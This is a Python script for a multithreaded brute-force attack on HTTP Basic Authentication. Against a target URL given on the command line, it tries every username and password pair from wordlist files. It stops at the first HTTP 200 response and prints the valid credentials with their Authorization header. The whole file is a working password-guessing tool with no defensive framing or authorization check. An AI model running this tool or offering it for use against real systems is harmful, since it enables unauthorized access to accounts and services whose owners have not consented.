import requests
import base64
import threading
import argparse

found_credentials = None
stop_threads = False
found_lock = threading.Lock()

def test_credentials(target_url, username, password):
    """Tests a single username:password combination."""
    global found_credentials, stop_threads, found_lock

    if stop_threads:
        return False

    credentials = f"{username}:{password}"
    base64_credentials = base64.b64encode(credentials.encode()).decode()
    headers = {"Authorization": f"Basic {base64_credentials}"}

    try:
        response = requests.get(target_url, headers=headers)
        print(f"[Thread {threading.get_ident()}] Trying: {username}:{password} - Status: {response.status_code}")
        if response.status_code == 200:
            with found_lock:
                if not found_credentials:
                    found_credentials = (username, password, base64_credentials)
                    stop_threads = True
                    print(f"\n[+] Success! Found valid credentials: {username}:{password} (Thread {threading.get_ident()})")
                    print(f"    Authorization Header: Basic {base64_credentials}")
                    return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"[Thread {threading.get_ident()}] Error: {e}")
        return False

def worker(target_url, username, passwords):
    """Worker function to try all passwords for a given username."""
    for password in passwords:
        if stop_threads:
            return
        if test_credentials(target_url, username, password):
            return

def threaded_brute_force_basic_auth(target_url, usernames_file, passwords_file, num_threads=5):
    """
    Performs a brute-force attack on HTTP Basic Authentication using threads and stops on success.
    """
    global stop_threads, found_credentials
    stop_threads = False
    found_credentials = None

    try:
        with open(usernames_file, 'r') as u_file:
            usernames = [line.strip() for line in u_file if line.strip()]

        with open(passwords_file, 'r') as p_file:
            passwords = [line.strip() for line in p_file if line.strip()]

        threads = []
        for username in usernames:
            thread = threading.Thread(target=worker, args=(target_url, username, passwords))
            threads.append(thread)
            thread.start()
            if len(threads) >= num_threads:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()

        if not found_credentials:
            print("\n[-] No valid credentials found.")
        return found_credentials

    except FileNotFoundError:
        print("Error: One or both of the specified files were not found.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multithreaded HTTP Basic Auth Brute Forcer")
    parser.add_argument("url", help="Target URL to brute-force")
    parser.add_argument("usernames", help="File with usernames (one per line)")
    parser.add_argument("passwords", help="File with passwords (one per line)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    args = parser.parse_args()

    result = threaded_brute_force_basic_auth(args.url, args.usernames, args.passwords, num_threads=args.threads)
    if result:
        username, password, auth_header = result
        print(f"\n[+] Found Credentials:")
        print(f"  Username: {username}")
        print(f"  Password: {password}")
        print(f"  Authorization: Basic {auth_header}")
